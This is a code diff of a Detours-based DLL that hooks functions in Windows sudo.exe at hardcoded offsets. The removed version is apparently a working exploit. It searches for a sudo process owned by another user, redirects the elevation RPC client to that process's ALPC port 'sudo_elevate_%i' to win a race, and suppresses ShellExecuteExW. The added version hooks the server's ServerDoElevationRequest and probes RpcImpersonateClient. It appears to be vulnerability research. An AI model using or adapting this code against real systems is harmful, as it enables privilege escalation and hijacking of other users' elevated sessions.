@@ -4,142 +4,64 @@
 #include <psapi.h>
 #include <Lmcons.h>
 
-struct rust_str {
+const DWORD kServerDoElevationRequestOffset = 0x8e840;
+struct rpc_internal_struct {
     unsigned int length;
     unsigned int reserved;
     BYTE* data;
 };
 
-const DWORD kClientDoElevationRequestOffset = 0x8ea50;
-const DWORD kSetupClientOffset = 0x8e770;
-const char* kSudoFile = "sudo.exe";
-const char* kSudoRpcFormat = "sudo_elevate_%i";
+typedef void(__fastcall* fnServerDoElevationRequest_t)(RPC_BINDING_HANDLE, HANDLE, HANDLE,
+    HANDLE, int, rpc_internal_struct, rpc_internal_struct, rpc_internal_struct,
+    rpc_internal_struct, GUID*, HANDLE);
 
-typedef BOOL(__stdcall* fnShellExec_t)(SHELLEXECUTEINFOW*);
-typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);
+fnServerDoElevationRequest_t OriginalServerDoElevationRequest = NULL;
 
-fnSetupClient_t OriginalSetupClient = NULL;
-char g_CurrentUser[UNLEN];
-DWORD g_targetPID = NULL;
-char g_targetAlpcPort[260];
-
-
-DWORD FindRunningSudo() {
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
-    unsigned int i;
-
-    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
-    {
-        return NULL;
+void __fastcall HookedServerDoElevationRequest(RPC_BINDING_HANDLE rpcHandle,
+    HANDLE input_process_handle, HANDLE pipe_handle, HANDLE file_handle, int run_mode,
+    rpc_internal_struct cmd, rpc_internal_struct param_7, rpc_internal_struct param_8,
+    rpc_internal_struct param_9, GUID* input_guid, HANDLE output_process) {
+    RPC_STATUS result = RpcImpersonateClient(rpcHandle);
+    if (result != RPC_S_OK) {
+        char debugString[100];
+        snprintf(debugString, 100, "Impersonation failed: %i\n", result);
+        OutputDebugStringA(debugString);
     }
-
-
-    // Calculate how many process identifiers were returned.
-
-    cProcesses = cbNeeded / sizeof(DWORD);
-
-    // Print the name and process identifier for each process.
-
-    for (i = 0; i < cProcesses; i++)
-    {
-        if (aProcesses[i] != 0)
-        {
-            HANDLE proccesHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, aProcesses[i]);
-            if (NULL != proccesHandle)
-            {
-                HANDLE hProcessToken = NULL;
-                char lpName[260];
-                char lpDomain[260];
-                if (OpenProcessToken(proccesHandle, TOKEN_QUERY, &hProcessToken)) {
-                    DWORD dwSize = 128;
-                    PTOKEN_USER ptu = (TOKEN_USER*)LocalAlloc(LMEM_FIXED, dwSize);
-                    if (GetTokenInformation(hProcessToken, TokenUser, ptu, dwSize, &dwSize)) {
-                        SID_NAME_USE SidType;
-                        if (LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
-                            if (strcmp(lpName, g_CurrentUser) == 0) {
-                                continue;
-                            }
-                        }
-                    }
-                }
-
-                char szProcessName[MAX_PATH] = "<unknown>";
-                DWORD dwLen = MAX_PATH;
-                QueryFullProcessImageNameA(proccesHandle, 0, szProcessName, &dwLen);
-                if (strcmp(szProcessName, "C:\\Windows\\System32\\sudo.exe") == 0) {
-                    printf("Found target sudo proccess %i\n", aProcesses[i]);
-                    return aProcesses[i];
-                }
-            }
-        }
+    else {
+        OutputDebugStringA("Impersonation successful.\n");
     }
-    return NULL;
-}
-
-// Luckily for us, the sudo logic will handle retrying this in a time-delayed loop, so
-// all we need to do is find a target PID and win the race.
-unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
-    while (g_targetPID == NULL) {
-        g_targetPID = FindRunningSudo();
-        if (g_targetPID != NULL) {
-            snprintf(g_targetAlpcPort, 260, kSudoRpcFormat, g_targetPID);
-            char szDebugLog[300];
-            snprintf(szDebugLog, 300, "Targeting ALPC port %s\n", g_targetAlpcPort);
-            OutputDebugStringA(szDebugLog);
-        }
-    }
-    return OriginalSetupClient(g_targetAlpcPort);
-}
-
-BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
-    OutputDebugStringA("Not running shell exec...\n");
-    return TRUE;
+    return OriginalServerDoElevationRequest(rpcHandle, input_process_handle, pipe_handle, file_handle, run_mode, cmd, param_7, param_8, param_9, input_guid, output_process);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
     if (DetourIsHelperProcess()) {
         return TRUE;
     }
-
-    DWORD szCurrentUserLen = UNLEN;
-    GetUserName(g_CurrentUser, &szCurrentUserLen);
+    HMODULE target_process_handle = GetModuleHandle(NULL);
+    OriginalServerDoElevationRequest = (fnServerDoElevationRequest_t)(target_process_handle + kServerDoElevationRequestOffset);
 
     if (dwReason == DLL_PROCESS_ATTACH) {
         HMODULE target_process_handle = GetModuleHandle(NULL);
         char* debugOutput = (char*)malloc(256);
         snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
         OutputDebugStringA(debugOutput);
-        OriginalSetupClient = (fnSetupClient_t)((unsigned long long)target_process_handle + kSetupClientOffset);
-        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalSetupClient);
-        OutputDebugStringA(debugOutput);
-
-        HMODULE hShell32 = GetModuleHandleA("Shell32");
-        snprintf(debugOutput, 256, "Got Shell32 Handle %p\n", (void*)hShell32);
-        OutputDebugStringA(debugOutput);
-        if (hShell32 == NULL) {
-            free(debugOutput);
-            return FALSE;
-        }
-        void* pShellExecuteExW = GetProcAddress(hShell32, "ShellExecuteExW");
-        snprintf(debugOutput, 256, "ShellExec target fp %p\n", (void*)pShellExecuteExW);
+        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalServerDoElevationRequest);
         OutputDebugStringA(debugOutput);
 
         DetourRestoreAfterWith();
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourAttach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
-        DetourAttach(&(PVOID&)pShellExecuteExW, HookedShellExecuteExW);
+        DetourAttach(&(PVOID&)OriginalServerDoElevationRequest, HookedServerDoElevationRequest);
         DetourTransactionCommit();
-        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedSetupClient);
+        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedServerDoElevationRequest);
         OutputDebugStringA(debugOutput);
         free(debugOutput);
     }
     else if (dwReason == DLL_PROCESS_DETACH) {
         HMODULE target_process_handle = GetModuleHandle(NULL);
-        OriginalSetupClient = (fnSetupClient_t)GetProcAddress(target_process_handle, "SetupClient");
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourDetach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
+        DetourDetach(&(PVOID&)OriginalServerDoElevationRequest, HookedServerDoElevationRequest);
         DetourTransactionCommit();
     }
     return TRUE;
